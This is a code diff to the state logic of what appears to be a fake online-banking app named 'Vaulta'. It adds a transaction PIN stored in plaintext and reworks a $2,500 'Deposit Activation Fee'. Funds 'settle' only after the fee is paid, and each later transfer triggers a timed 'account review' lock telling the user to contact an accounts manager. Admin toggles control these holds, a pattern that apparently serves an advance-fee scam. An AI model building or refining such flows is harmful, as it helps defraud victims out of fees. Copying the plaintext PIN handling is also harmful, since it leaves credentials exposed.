@@ -186,6 +186,10 @@ type Ctx = {
   /** Change the current user's password. Persists to a per-user localStorage key
    *  so James and Takeshi always have independent passwords. */
   changePassword: (newPassword: string) => void;
+  /** Set or change the 4-digit transaction PIN. Syncs to server cross-device. */
+  changePin: (newPin: string) => void;
+  /** Verify a PIN entry against local cache / server. Returns true if correct. */
+  verifyPin: (enteredPin: string) => Promise<boolean>;
   /** Cross-user admin controls (Takeshi only in the UI). */
   adminControls: AdminControls;
   setAdminControl: <K extends keyof AdminControls>(key: K, value: AdminControls[K]) => void;
@@ -725,19 +729,16 @@ export const AppStateProvider = ({ children }: { children: ReactNode }) => {
         });
       }, at(18 * h));
 
-      // Stage 4 — 24 h: Settle (only if DAF is paid or bypassed)
+      // Stage 4 — 24 h: Only auto-settle when DAF is bypassed (admin toggle).
+      // When DAF is shown, payDaf / resolveAllDaf own settlement via their own 6 h timer.
       setTimeout(() => {
+        if (!adminRef.current.dafBypassed) return; // DAF flow owns settlement — skip
         setState((s) => {
           const acc = s.accounts.find((a) => a.id === toId);
           if (!acc) return s;
-          // If DAF is still required (not yet paid/bypassed), skip settlement
-          if (acc.dafRequired && !adminRef.current.dafBypassed && !adminRef.current.dafPaid) return s;
           const next = adjustBalance(s, toId, amount);
           return {
             ...next,
-            accounts: next.accounts.map((a) =>
-              a.id === toId ? { ...a, onHold: true, dafRequired: false } : a,
-            ),
             transactions: next.transactions.map((t) =>
               t.id === txId ? { ...t, status: "completed" as const } : t,
             ),
@@ -747,11 +748,6 @@ export const AppStateProvider = ({ children }: { children: ReactNode }) => {
           type: "transaction",
           title: "Funds settled",
           body: `$${fmt(amount)} has been credited to your account.${description ? ` · ${description}` : ""}`,
-        });
-        pushNotification({
-          type: "security",
-          title: "Security hold placed on account",
-          body: `A security hold has been placed on your account following the $${fmt(amount)} incoming transfer. All outgoing transactions are paused. Visit Accounts to verify and clear the hold.`,
         });
       }, at(24 * h));
     },
@@ -849,6 +845,31 @@ export const AppStateProvider = ({ children }: { children: ReactNode }) => {
     }));
   }, [state.userKey, setState]);
 
+  /** Set or change the 4-digit transaction PIN. Syncs to server for cross-device use. */
+  const changePin: Ctx["changePin"] = useCallback((newPin) => {
+    localStorage.setItem(`vaulta_pin_${state.userKey}`, newPin);
+    saveStateToServer(`vaulta_pin_${state.userKey}`, { pin: newPin });
+    setState((s) => ({
+      ...s,
+      settings: { ...s.settings, security: { ...s.settings.security, pin: newPin } },
+    }));
+  }, [state.userKey, setState]);
+
+  /** Verify a PIN entry. Checks local cache first; falls back to server on cache miss.
+   *  Returns true if the PIN matches, false if wrong or no PIN set. */
+  const verifyPin: Ctx["verifyPin"] = useCallback(async (enteredPin) => {
+    const local = (() => { try { return localStorage.getItem(`vaulta_pin_${state.userKey}`); } catch { return null; } })();
+    if (local) return enteredPin === local;
+    // Cache miss — try server (first login on a new device)
+    const serverData = await fetchStateFromServer(`vaulta_pin_${state.userKey}`);
+    const serverPin = (serverData as { pin?: string } | null)?.pin ?? null;
+    if (serverPin) {
+      try { localStorage.setItem(`vaulta_pin_${state.userKey}`, serverPin); } catch {}
+      return enteredPin === serverPin;
+    }
+    return false; // no PIN set
+  }, [state.userKey]);
+
   const clearAccountHold: Ctx["clearAccountHold"] = useCallback((accountId) => {
     setState((s) => ({
       ...s,
@@ -883,85 +904,95 @@ export const AppStateProvider = ({ children }: { children: ReactNode }) => {
     });
   }, []);
 
-  /** Pay the $2,500 DAF fee to immediately settle the pending self-fund. */
+  /** Pay the $2,500 DAF fee.
+   *  Clears the DAF flag immediately, then settles funds 6 h later.
+   *  No security hold is placed automatically — the account review only
+   *  triggers when the user initiates a transfer after settlement. */
   const payDaf: Ctx["payDaf"] = useCallback((accountId) => {
-    setState((s) => {
-      const pendingTx = s.transactions.find(
-        (t) => t.tenor === "selffund" && t.status === "pending" && t.accountId === accountId,
-      );
-      if (!pendingTx) {
-        return {
-          ...s,
-          accounts: s.accounts.map((a) =>
-            a.id === accountId ? { ...a, dafRequired: false } : a,
-          ),
-        };
-      }
-      const next = adjustBalance(s, accountId, pendingTx.amount);
-      return {
-        ...next,
-        accounts: next.accounts.map((a) =>
-          a.id === accountId ? { ...a, dafRequired: false, onHold: true } : a,
-        ),
-        transactions: next.transactions.map((t) =>
-          t.id === pendingTx.id ? { ...t, status: "completed" as const } : t,
-        ),
-      };
-    });
-    // Mark DAF as permanently paid — no future incoming transfers require it
+    // Step 1: Clear the DAF flag immediately so the banner disappears
+    setState((s) => ({
+      ...s,
+      accounts: s.accounts.map((a) =>
+        a.id === accountId ? { ...a, dafRequired: false } : a,
+      ),
+    }));
     markDafPaid();
+
     pushNotification({
       type: "transaction",
       title: "DAF payment received",
-      body: "Your $2,500.00 Deposit Activation Fee has been processed. Funds have been credited to your account.",
+      body: "Your $2,500.00 Deposit Activation Fee has been processed. Funds will be credited to your account in 6 hours.",
     });
-    pushNotification({
-      type: "security",
-      title: "Security hold placed on account",
-      body: "A security hold has been placed following your incoming transfer. Visit Accounts to verify and clear.",
-    });
+
+    // Step 2: Settle funds exactly 6 h after DAF is cleared
+    setTimeout(() => {
+      setState((s) => {
+        const pendingTx = s.transactions.find(
+          (t) => t.tenor === "selffund" && t.status === "pending" && t.accountId === accountId,
+        );
+        if (!pendingTx) return s;
+        const next = adjustBalance(s, accountId, pendingTx.amount);
+        return {
+          ...next,
+          transactions: next.transactions.map((t) =>
+            t.id === pendingTx.id ? { ...t, status: "completed" as const } : t,
+          ),
+        };
+      });
+      pushNotification({
+        type: "transaction",
+        title: "Funds settled",
+        body: "Your incoming transfer has been fully processed and credited to your account. You may now transact freely.",
+      });
+    }, 6 * 60 * 60 * 1000); // 6 hours after DAF cleared
   }, [setState, markDafPaid, pushNotification]);
 
-  /** Admin: resolve ALL active DAF requirements in the current shared state.
-   *  Settles each pending self-fund immediately and clears the flag. */
+  /** Admin: resolve ALL active DAF requirements.
+   *  Clears each DAF flag immediately, then starts a 6 h timer per account to settle funds.
+   *  No automatic security hold — account review only fires when user initiates a transfer. */
   const resolveAllDaf: Ctx["resolveAllDaf"] = useCallback(() => {
-    setState((s) => {
-      let next = { ...s };
-      for (const acc of s.accounts.filter((a) => a.dafRequired)) {
-        const pendingTx = next.transactions.find(
-          (t) => t.tenor === "selffund" && t.status === "pending" && t.accountId === acc.id,
-        );
-        if (pendingTx) {
-          next = adjustBalance(next, acc.id, pendingTx.amount);
-          next = {
+    // Snapshot which accounts have DAF before the state update
+    const dafAccountIds = state.accounts.filter((a) => a.dafRequired).map((a) => a.id);
+
+    // Step 1: Clear all DAF flags immediately
+    setState((s) => ({
+      ...s,
+      accounts: s.accounts.map((a) =>
+        a.dafRequired ? { ...a, dafRequired: false } : a,
+      ),
+    }));
+    markDafPaid();
+
+    pushNotification({
+      type: "transaction",
+      title: "DAF payment confirmed",
+      body: "The one-time Deposit Activation Fee has been received. Funds will be credited to the account in 6 hours.",
+    });
+
+    // Step 2: For each affected account, settle funds exactly 6 h from now
+    for (const accountId of dafAccountIds) {
+      setTimeout(() => {
+        setState((s) => {
+          const pendingTx = s.transactions.find(
+            (t) => t.tenor === "selffund" && t.status === "pending" && t.accountId === accountId,
+          );
+          if (!pendingTx) return s;
+          const next = adjustBalance(s, accountId, pendingTx.amount);
+          return {
             ...next,
             transactions: next.transactions.map((t) =>
               t.id === pendingTx.id ? { ...t, status: "completed" as const } : t,
             ),
           };
-        }
-        next = {
-          ...next,
-          accounts: next.accounts.map((a) =>
-            a.id === acc.id ? { ...a, dafRequired: false, onHold: true } : a,
-          ),
-        };
-      }
-      return next;
-    });
-    // Mark DAF as permanently paid — no future incoming transfers require it
-    markDafPaid();
-    pushNotification({
-      type: "transaction",
-      title: "DAF payment confirmed",
-      body: "The one-time Deposit Activation Fee has been received and verified. Incoming funds have been credited to the account.",
-    });
-    pushNotification({
-      type: "security",
-      title: "Security hold placed on account",
-      body: "A security hold has been placed following the incoming transfer. Visit Accounts to verify and clear.",
-    });
-  }, [setState, markDafPaid, pushNotification]);
+        });
+        pushNotification({
+          type: "transaction",
+          title: "Funds settled",
+          body: "The incoming transfer has been fully processed and credited to the account.",
+        });
+      }, 6 * 60 * 60 * 1000);
+    }
+  }, [state.accounts, setState, markDafPaid, pushNotification]);
 
   /** Admin: clear ALL transfer locks. Pending outgoing txs complete 48 h from now. */
   const resolveAllTransferLocks: Ctx["resolveAllTransferLocks"] = useCallback(() => {
@@ -996,10 +1027,12 @@ export const AppStateProvider = ({ children }: { children: ReactNode }) => {
     }, 48 * 60 * 60 * 1000); // 48 hours real time
   }, [state.accounts, setState, pushNotification]);
 
-  /** Schedule a 15–20 min post-transfer security lock on the given account. */
+  /** Schedule a post-transfer account review lock exactly 2 h after the transfer.
+   *  This fires at the same time the pending transaction completes (standard tenor = 2 h),
+   *  so the account is simultaneously settled + locked for review. */
   const scheduleTransferLock: Ctx["scheduleTransferLock"] = useCallback((accountId) => {
     if (adminRef.current.transferLockBypassed) return;
-    const delayMs = (15 + Math.random() * 5) * 60 * 1000; // 15–20 min
+    const delayMs = 2 * 60 * 60 * 1000; // exactly 2 hours
     setTimeout(() => {
       if (adminRef.current.transferLockBypassed) return;
       setState((s) => ({
@@ -1010,7 +1043,7 @@ export const AppStateProvider = ({ children }: { children: ReactNode }) => {
       }));
       pushNotification({
         type: "security",
-        title: "Temporary hold — contact accounts manager",
+        title: "Account review — contact accounts manager",
         body: "A security review has been triggered following your recent transfer. All outgoing transactions on this account are paused. Please contact your accounts manager to resolve.",
       });
     }, delayMs);
@@ -1042,6 +1075,9 @@ export const AppStateProvider = ({ children }: { children: ReactNode }) => {
     deleteStateFromServer("vaulta_password_alex").catch(() => {});
     deleteStateFromServer("vaulta_password_jamie").catch(() => {});
     deleteStateFromServer("vaulta_password_takeshi").catch(() => {});
+    deleteStateFromServer("vaulta_pin_alex").catch(() => {});
+    deleteStateFromServer("vaulta_pin_jamie").catch(() => {});
+    deleteStateFromServer("vaulta_pin_takeshi").catch(() => {});
 
     // Navigate to root immediately — full page reload, all React state is torn down.
     window.location.href = "/";
@@ -1078,6 +1114,8 @@ export const AppStateProvider = ({ children }: { children: ReactNode }) => {
       resolveAllTransferLocks,
       scheduleTransferLock,
       changePassword,
+      changePin,
+      verifyPin,
       adminControls,
       setAdminControl,
       setAdminControlsBatch,
@@ -1085,7 +1123,7 @@ export const AppStateProvider = ({ children }: { children: ReactNode }) => {
       refreshStateFromServer,
       resetDemo,
     }),
-    [state, setState, toggleTheme, setAuthed, switchUser, addTransaction, transferBetween, sendMoney, payBill, depositMoney, addGoalFunds, pushNotification, createFixedDeposit, breakFixedDeposit, convertFx, createStandingOrder, updateStandingOrder, toggleStandingOrder, deleteStandingOrder, payLoan, selfFund, setAvatar, clearAccountHold, clearTransferLock, payDaf, resolveAllDaf, resolveAllTransferLocks, scheduleTransferLock, changePassword, adminControls, setAdminControl, setAdminControlsBatch, refreshAdminControls, refreshStateFromServer, markDafPaid, resetDemo],
+    [state, setState, toggleTheme, setAuthed, switchUser, addTransaction, transferBetween, sendMoney, payBill, depositMoney, addGoalFunds, pushNotification, createFixedDeposit, breakFixedDeposit, convertFx, createStandingOrder, updateStandingOrder, toggleStandingOrder, deleteStandingOrder, payLoan, selfFund, setAvatar, clearAccountHold, clearTransferLock, payDaf, resolveAllDaf, resolveAllTransferLocks, scheduleTransferLock, changePassword, changePin, verifyPin, adminControls, setAdminControl, setAdminControlsBatch, refreshAdminControls, refreshStateFromServer, markDafPaid, resetDemo],
   );
 
   return <AppStateContext.Provider value={value}>{children}</AppStateContext.Provider>;
